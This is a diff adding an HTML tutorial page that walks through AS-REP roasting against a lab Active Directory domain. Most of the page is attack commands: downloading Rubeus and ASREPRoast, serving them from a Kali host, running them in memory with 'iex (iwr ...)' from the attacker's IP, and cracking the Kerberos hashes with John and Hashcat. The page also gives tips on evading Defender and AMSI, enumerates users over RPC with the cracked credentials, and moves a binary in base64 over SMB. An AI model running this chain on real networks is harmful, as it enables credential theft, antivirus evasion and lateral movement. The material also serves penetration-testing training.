@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AsRepRoasting</title>
+    <link rel="stylesheet" href="../styles.css"> <!-- Adjust the path as needed -->
+</head>
+<body>
+
+    <div class="content">
+        <h2>AsRepRoasting With PowerShell</h2>
+        <p>When a user has Kerberos Pre-Authentication Not Required, in this case alice.wonderland, we can request a Keberos hash for that user. </p>
+        <p>Utilziing tools like Hashcat or John the Ripper we can then crack the Kerberos hash, thus showing the users password.</p>
+        <p>For this we will be transferring files on the Victim machine utilizing our Kali machine.</p>
+        <p>Lets download the tools needed:</p>
+        <div class="kali-terminal-wrapper">
+            <div class="kali-terminal">
+                <div class="terminal-header">
+                    <span>Kali Terminal</span>
+                    <div class="terminal-controls">
+                        <button class="minimize">-</button>
+                        <button class="maximize">+</button>
+                        <button class="close">X</button>
+                    </div>
+                </div>
+                <pre> 
+mkdir /home/kali/MarauderSec
+cd /home/kali/MarauderSec                  
+#invoke-rubeus
+wget https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/refs/heads/master/PowerSharpBinaries/Invoke-Rubeus.ps1
+#rubeus.exe
+wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/dotnet%20v4.8.1%20compiled%20binaries/Rubeus.exe
+#AsRepRoast by HarmJ0y
+wget https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/refs/heads/master/ASREPRoast.ps1
+                </pre>
+            </div>
+        </div>
+        <p>As you can see from the downloads above there are many tools for this, and even more are out there. We will stick with the three that we currently have.</p>
+        <p>Now we need to transfer those tools to the Server, we can do that multiple ways.</p>
+
+        <div class="kali-terminal-wrapper">
+            <div class="kali-terminal">
+                <div class="terminal-header">
+                    <span>Kali Terminal</span>
+                    <div class="terminal-controls">
+                        <button class="minimize">-</button>
+                        <button class="maximize">+</button>
+                        <button class="close">X</button>
+                    </div>
+                </div>
+                <pre>   
+
+#Using Python3 Web Server
+python3 -m http.server 80
+#Using SCP
+sudo systemctl enable ssh
+#Using SMB Share
+smbserver.py -smb2support share .
+#Base64 file then copy and paste encoded text
+base64 -w0 Rubeus.exe > rubeus.txt
+
+                </pre>
+            </div>
+        </div>
+         <div class="image-container">
+             <img src="../images/FileTransferLinux.jpg" alt="File Transfer Linux">
+         </div>
+        <p>Notice above on our web server we are using port 80, depending on your Kali setup you may need to run sudo to run a web server on port 80.</p>
+        <p>Moving over to the windows machine we can now download, or put files into memory. Whenever utilizing Invoke-Expression Invoke-WebRequest "iex (iwr ...) we put the file in memory."</p>
+        <p>If the file is in memory it is more likley to bypass Defender, however, if you receive the that the file is a virus that is usually AMSI and that can also be bypassed.</p>
+        
+        <div class="powershell-terminal-wrapper">
+            <div class="powershell-terminal">
+                <div class="terminal-header">
+                    <span>PowerShell Terminal</span>
+                    <div class="terminal-controls">
+                        <button class="minimize">-</button>
+                        <button class="maximize">+</button>
+                        <button class="close">X</button>
+                    </div>
+                </div>
+                <pre>   
+#Using SCP
+scp kali@192.168.0.53:/home/kali/MarauderSec/Rubeus.exe .
+#Putting into PowerShell Memory
+iex (iwr -usebasicparsing http://192.168.0.53/Invoke-Rubeus)
+#Saving on disk
+wget -usebasicparsing http://192.168.0.53/ASREPRoast.ps1 -o asrep.ps1
+                </pre>
+            </div>
+        </div>
+         <div class="image-container">
+             <img src="../images/FileTransferLinuxToWindows.jpg" alt="File Transfer">
+         </div>    
+        <p>We notice that I did not use the share yet, that is due to security reasons with unathenticated shares. Once we crack the AsRepRoastable Hash we will have a password and copy over the base64 file and decode it.</p>
+        <p>Now that we have a few differnet ways to conduct AsRepRoasting lets start with Invoke-Rubeus, then Rubeus.exe, then ASREPRoast.ps1</p>
+
+        <div class="powershell-terminal-wrapper">
+            <div class="powershell-terminal">
+                <div class="terminal-header">
+                    <span>PowerShell Terminal</span>
+                    <div class="terminal-controls">
+                        <button class="minimize">-</button>
+                        <button class="maximize">+</button>
+                        <button class="close">X</button>
+                    </div>
+                </div>
+                <pre>    
+Invoke-Rubeus -Command asreproast
+./Rubeus.exe asreproast
+#Loads Module 
+. ./asrep.ps1
+#Commands ran from asrep.ps1
+Invoke-ASREPRoast
+                </pre>
+            </div>
+        </div>                       
+         <div class="image-container">
+             <img src="../images/InvokeRubeus.jpg" alt="Invoke-Rubeus">
+         </div>     
+         <div class="image-container">
+             <img src="../images/RubeusAsRep.jpg" alt="Rubeus">
+         </div>             
+         <div class="image-container">
+             <img src="../images/Invoke-AsRep.jpg" alt="Invoke-ASREPRoast">
+         </div>       
+        <h2>AsRepRoasting With PowerShell</h2>
+        <p>Now looking at AsRepRoasting from Linux.</p>
+
+        <div class="kali-terminal-wrapper">
+            <div class="kali-terminal">
+                <div class="terminal-header">
+                    <span>Kali Terminal</span>
+                    <div class="terminal-controls">
+                        <button class="minimize">-</button>
+                        <button class="maximize">+</button>
+                        <button class="close">X</button>
+                    </div>
+                </div>
+                <pre>          
+#Using Impacket
+GetNPUsers.py -no-pass -usersfile usernames.txt maraudersec.local/
+#Using Impacket and cracking hash with John
+GetNPUsers.py -no-pass -usersfile usernames.txt maraudersec.local/ | grep -ia krb5 > hash.txt ; john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+#Using Impacket and cracking hash with Hashcat
+GetNPUsers.py -no-pass -usersfile usernames.txt maraudersec.local/ | grep -ia krb5 > hash.txt ; hashcat hash.txt /usr/share/wordlists/rockyou.txt
+#Using NetExec with Username and Password
+nxc ldap $DC -u 'alice.wonderland' -p 'P@ssw0rd!' --asreproast usernames.txt
+
+                </pre>
+            </div>
+        </div>
+        <p>Now that we have a Username and Password we can try for some RPC Enumeration</p>
+
+        <div class="kali-terminal-wrapper">
+            <div class="kali-terminal">
+                <div class="terminal-header">
+                    <span>Kali Terminal</span>
+                    <div class="terminal-controls">
+                        <button class="minimize">-</button>
+                        <button class="maximize">+</button>
+                        <button class="close">X</button>
+                    </div>
+                </div>
+                <pre>   
+rpcclient -U "alice.wonderland" $DC
+enumdomusers
+                </pre>
+            </div>
+        </div>
+        <div class="image-container">
+             <img src="../images/rpcclient_Linux.jpg" alt="RCP Client Linux">
+         </div>       
+
+        <p>We can also utilizing an SMB Server on Kali to send the Base64 encoded text to the Windows machine now with credentials.</p>
+                
+        <div class="kali-terminal-wrapper">
+            <div class="kali-terminal">
+                <div class="terminal-header">
+                    <span>Kali Terminal</span>
+                    <div class="terminal-controls">
+                        <button class="minimize">-</button>
+                        <button class="maximize">+</button>
+                        <button class="close">X</button>
+                    </div>
+                </div>
+                <pre>   
+
+smbserver.py -smb2support share . -username alice.wonderland -password 'P@ssw0rd!'
+base64 -w0 Rubeus.exe > rubeus.txt
+
+                </pre>
+            </div>
+        </div>
+          <div class="image-container">
+             <img src="../images/base64_SMB.jpg" alt="Kerbrute">
+         </div>
+        <p>Now on the PowerShell Terminal we can copy the file from the share</p>
+
+        <div class="powershell-terminal-wrapper">
+            <div class="powershell-terminal">
+                <div class="terminal-header">
+                    <span>PowerShell Terminal</span>
+                    <div class="terminal-controls">
+                        <button class="minimize">-</button>
+                        <button class="maximize">+</button>
+                        <button class="close">X</button>
+                    </div>
+                </div>
+                <pre>   
+#Remember to use your Kali IP                    
+cp \\192.168.0.53\share\rubeus.txt
+                </pre>
+            </div>
+        </div>
+        <div class="image-container">
+             <img src="../images/base64_SMB_share_to_windows.jpg" alt="SMB Share">
+         </div>
+
+         <p>If the above does not copy the rubeus.txt file over, go ahead and open the share within File Explorer with \\192.168.0.53\share and then go back to PowerShell and try again. When asked for Credentials you can put in Alice.Wonderlands credentials that we found earlier</p>  
+         <p>Now that we have the text file, remember we could have also copied and pasted this, we can now delete rubues.exe and make another file from the base64 txt file we have.</p>
+        <div class="powershell-terminal-wrapper">
+            <div class="powershell-terminal">
+                <div class="terminal-header">
+                    <span>PowerShell Terminal</span>
+                    <div class="terminal-controls">
+                        <button class="minimize">-</button>
+                        <button class="maximize">+</button>
+                        <button class="close">X</button>
+                    </div>
+                </div>
+                <pre>   
+del .\Rubeus.exe                    
+# Define file paths
+$Base64File = "C:\Temp\rubeus.txt"
+$OutputFile = "C:\Temp\rubeus.exe"
+
+# Read the Base64 content
+$Base64String = Get-Content $Base64File -Raw
+
+# Convert from Base64 to binary
+$Bytes = [System.Convert]::FromBase64String($Base64String)
+
+# Write the decoded bytes to the output file
+[System.IO.File]::WriteAllBytes($OutputFile, $Bytes)
+
+Write-Host "Decoding complete. File saved as $OutputFile"
+                </pre>
+            </div>
+        </div>
+        <div class="image-container">
+             <img src="../images/Decode1.jpg" alt="Decode">
+         </div>
+         <div class="image-container">
+             <img src="../images/Decode2.jpg" alt="Decode">
+         </div>
+    <script>
+        function copyToClipboard() {
+            var terminalContent = document.querySelector('.kali-terminal pre').textContent;
+            var textArea = document.createElement('textarea');
+            textArea.value = terminalContent;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+            alert("Copied to clipboard!");
+        }
+    </script>
+</body>
+</html>
